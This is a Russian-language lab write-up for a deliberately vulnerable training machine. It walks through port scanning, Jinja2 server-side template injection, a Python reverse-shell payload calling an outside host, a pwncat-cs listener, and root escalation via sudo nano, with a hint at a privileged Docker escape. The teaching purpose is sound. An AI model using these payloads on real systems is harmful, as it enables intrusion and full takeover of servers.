# LifeTrainings - занятие от 27.03.2023

### Установка и локальный запуск

Для успешного запуска данной машины требуется установить [docker](https://habr.com/ru/articles/253877/) и выполнить следующую команду из данной директории:
```bash
docker compose up --build -d
```
В случае запуска на локальной машине - некоторые шаги по получению ReverseShell будут другими.
___

### Уязвимая машина Easy (pentest)
___
**Задача:** имея на входе только ip адрес сервиса получить полный доступ (права root) на уязвимой машине

**Решение:**

1. Этап сканирования: 
```bash
masscan -p1-65535 <ip> --rate=1000
```
<details>
    <summary>Справка по ключам</summary>
    -p1-65535 - сканировать порты TCP от 1 до 65535 

    <ip> - айпи адрес уязвимой машины  
    
    --rate=1000 - количество пакетов посылаемое в секунду. При увеличении рейта увеличиться и скорость сканирования, но нектороые данные могут потеряться, т.к. сетевая карта/ширина канала не успеет/не позволит их обработать.
</details>
После сканирования известно о 3 открытых портах:
22 tcp - ssh хоста
2222 tcp - ssh проброшенный с контейнера
8090 tcp - web сервис

2. Изучение сайта на порту 8090:
 - Сайт содержит информацию про так называемые шаблоны страниц.
 - Можно попробовать проверить функционал работы данного шаблона.
 - Если бегло погуглить уязвиомости **jinja2**, которая используется для построения шаблонов (что кстати снова намекает нам на использования фреймворка **flask** и языка **python**) - можно найти информацию про [SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection).

3. Пробуем подставить базовый шаблон `{{7*7}}`, видим ответ `49` и понимаем что попали в точку - перед нами типичная Server-Side-Template-Injection! Осталось проэксплуатировать.

4. Есть много разных пейлоадов, типа [таких](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---forcing-output-on-blind-rce), [таких](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-ospopenread) и даже [таких классических](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-subprocesspopen)

Возьмем самый короткий (и один из самых стабильных, в отличии от "классического", в данном случае на мне придется перебирать сабклассы и методы):
```jinja2
{{ lipsum.__globals__["os"].popen('id').read() }}
```

Работает! Ну теперь получим ReverseShell, воспользовавшись уже знакомым [сайтом](https://www.revshells.com), тут вариантов много, выбираем какой нравиться. На занятии вам показывали такой вариант:
```jinja2
{{ cycler.__init__.__globals__.os.popen('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"5.5.5.5\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")\'').read() }}
```

Но можно придумать чуть более лакончиный и простой

4. Не забудем поднять listener (в этот раз возьмем pwncat-cs, что-бы научиться чему то новому):
- вводим на нашем сервере команду `pwncat-cs bind://0.0.0.0:1337`, что позволит нам запустить наш лисенер на внешнем адресе сервера (0.0.0.0 - означает внешний адрес).
- отправляем наш пейлоад полученный на шаге 3 на сервер и ловим сессию!
- теперь для того что бы переключиться на терминал удаленной машины - вводим команду back
- для того что бы вернуться на терминал нашего сервера - нажимаем сочетание клавиш ctrl+d
- стягиваем первый флаг из /home/server/user.txt

5. Теперь необходимо повысить привелегии до рута, можно загрузить различные linpeas.sh (или просто внимательно изучить документация pwncat-cs), а можно сразу на удачу вбить `sudo -l` (что это и для чего обьяснялось на предыдущем занятии) и увидеть следующую строку:
```bash
(ALL : ALL) NOPASSWD: /usr/bin/nano
```

Что означает что нам разрешен запуск от имени рута без ввода пароля программы `/usr/bin/nano`.

6. Воспользуемся [знакомым уже gtfobins](https://gtfobins.github.io) или же можно локально (на нашем сервере) вбить следующую команду и получить готовый результат:
```
gtfo -b nano
```

В любом из двух случаев найдем следующий лайфхак:
```
sudo nano
	^R^X
	reset; sh 1>&0 2>&0
```

Запускаем данные команду (не забыв указать полный путь до исполняемого бинарника nano - `/usr/bin/nano`) и получаем права root! Второй флаг лежит в /root/root.txt

7. А вот теперь перейдем к самой мякотке - мы можем выбраться еще дальше и повеселиться еще больше.
Если обратим внимание на [файл](docker-compose.yml), то увидим интересную строчку `privileged: true`.
А значит, мы можем выбраться из [docker'a](https://rioasmara.com/2021/08/11/docker-privileged-mode-for-privilege-escalation/).
Но для начала нам надо познакомитсья с самим докером, а уже потом научитсья из него сбегать.
Так это совсем другая история ;)

